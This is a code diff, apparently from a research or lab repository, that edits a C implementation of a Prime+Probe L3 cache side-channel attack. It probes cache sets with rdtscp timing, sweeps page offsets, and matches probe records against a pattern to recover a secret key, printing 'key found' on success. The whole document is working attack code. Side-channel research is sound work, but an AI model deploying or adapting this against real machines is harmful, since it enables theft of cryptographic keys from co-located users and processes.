@@ -198,8 +198,8 @@ static void sample(pp_t pp, char *record, int samplecount) {
   uint32_t p = rdtscp();
   /*a miss in the probing set represented by @, all hit is "."*/
   for (int i = 0; i < samplecount; i++) {
-    //record[i] = pp_probe(pp) ? '@' : '.';
-      record[i] = pp_probe(pp);
+     record[i] = pp_probe(pp) ? '@' : '.';
+     // record[i] = pp_probe(pp);
     do {
     } while (rdtscp() - p < SLOT);
     p = rdtscp();
@@ -245,21 +245,22 @@ static void attack(cachemap_t cm) {
   pp_t *pps[256];
 
   int found = 0;
-  for (int offset = 0; offset < 4096; offset += 64) {
-  //for (int offset = 0xd00; offset < 0xe00; offset += 64) {
+  //for (int offset = 0; offset < 4096; offset += 64) {
+  for (int offset = 0xd00; offset < 0xe00; offset += 64) {
     for (int i = 0; i < cm->nsets; i++)
       pps[i] = pp_prepare(cm->sets[i], L3_ASSOCIATIVITY, offset);
-    //printf("Trying offset 0x%03x\n", offset);
+    printf("Trying offset 0x%03x\n", offset);
     for (int i = 0; i < cm->nsets; i++) {
       sample(pps[i], record, SEARCHLEN);
 
       /*print out the search record, using to generate heat maps
        may take 1 hour to run*/
+#if 0
       for (int z = 0; z < SEARCHLEN; z++)
           printf("%d ", record[z]);
       printf("\n");
-#if 0
-      //printf("%d[0x%03x] - %.300s\n", i, offset, record);
+#else 
+      printf("%d[0x%03x] - %.300s\n", i, offset, record);
       int matches = matchcount(record, mask, ALLOWEDMISSES);
       if (matches > SEARCHLEN*2/strlen(mask)/3) {
           /*matches at the cache set with offset, probing record....*/
@@ -298,7 +299,7 @@ static void attack(cachemap_t cm) {
 #endif
     }
   }
-  //printf("Attack completed - %skey found\n", found ? "" : "no ");
+  printf("Attack completed - %skey found\n", found ? "" : "no ");
 }
 #if 0
 /*sandy bridge machine frequency 3.4GHZ*/
